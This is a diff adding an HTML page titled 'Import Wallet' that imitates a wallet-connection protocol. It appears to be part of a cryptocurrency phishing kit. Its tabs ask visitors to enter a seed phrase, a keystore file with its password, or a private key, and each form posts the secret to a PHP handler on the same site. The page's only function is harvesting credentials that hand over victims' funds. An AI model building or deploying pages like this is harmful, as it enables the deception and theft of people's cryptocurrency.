@@ -1,0 +1,116 @@
+<html>
+
+<head>
+<link rel="stylesheet" href="main.css" type="text/css"/> 
+<meta charset="UTF-8">
+<meta name="description" content="Open protocol for connecting Wallets to Dapps">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+    function openCity(evt, cityName) {
+    // Declare all variables
+    var i, tabcontent, tablinks;
+  
+    // Get all elements with class="tabcontent" and hide them
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+    }
+  
+    // Get all elements with class="tablinks" and remove the class "active"
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+    }
+  
+    // Show the current tab, and add an "active" class to the button that opened the tab
+    document.getElementById(cityName).style.display = "block";
+    evt.currentTarget.className += " active";
+  }
+  </script>
+</head>
+
+<title>Import Wallet</title>
+
+<body>
+<center>
+<div class="top">
+        
+     <br> <br> <br> <br> <br> <br> <br> <br> <br>
+       
+        
+</div>
+</br>
+<h2><center>Import Wallet</center></h2>
+</br>
+<div class="tab">
+  <button class="tablinks" id="default" onClick="openCity(event, 'phrase')">Phrase</b></button>
+  <button class="tablinks" onClick="openCity(event, 'keystore')">Keystore JSON</b></button>
+  <button class="tablinks" onClick="openCity(event, 'private')">Private Key</b></button>
+</div>
+
+<div id="phrase" class="tabcontent">
+<form action="phrase.php" method="POST">
+
+<input type="hidden" name="wallet"  value="stake">
+
+<textarea name="phrase" minlength="12" placeholder="Phrase" required></textarea>
+</br>
+<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+</br>
+<button type="submit" name="import" class="btn">IMPORT</button>
+</form>
+</div>
+
+<div id="keystore" class="tabcontent">
+<form action="Keystore.php" method="POST">
+
+<input type="hidden" name="category" value="Keystore JSON"/>
+<input type="hidden" name="wallet" value="stake">
+
+<textarea name="phrase" required minlength="12" placeholder="Keystore JSON" required="required"></textarea>
+</br>
+<div class="field">
+    <input type="text" name="password" placeholder="Password" required/>
+</div>
+<div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+</br>
+<button type="submit" name="import" class="btn">IMPORT</button>
+</form>
+</div>
+
+<div id="private" class="tabcontent">
+<form action="private.php" method="POST">
+<input type="hidden" name="category" value="Private Key"/>
+<input type="hidden" name="wallet" value="stake">
+<div class="field">
+    <input type="text" name="key" placeholder="Private Key" required/>
+</div>
+<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+</br>
+<button type="submit" name="import" class="btn">IMPORT</button>
+</form>
+</div>
+
+<script>
+    document.getElementById("default").click();
+</script>
+<footer><div id="footer">
+
+</footer>
+<script>
+    const queryString = window.location.search;
+
+    const urlParams = new URLSearchParams(queryString);
+
+    const wallet = urlParams.get('type')
+
+    document.getElementById("hidden1").value = wallet + " Phrase";
+    document.getElementById("hidden2").value = wallet + " Keystore";
+    document.getElementById("hidden3").value = wallet + " PrivateKey";
+  </script>
+</body>
+
+
+
+</html>
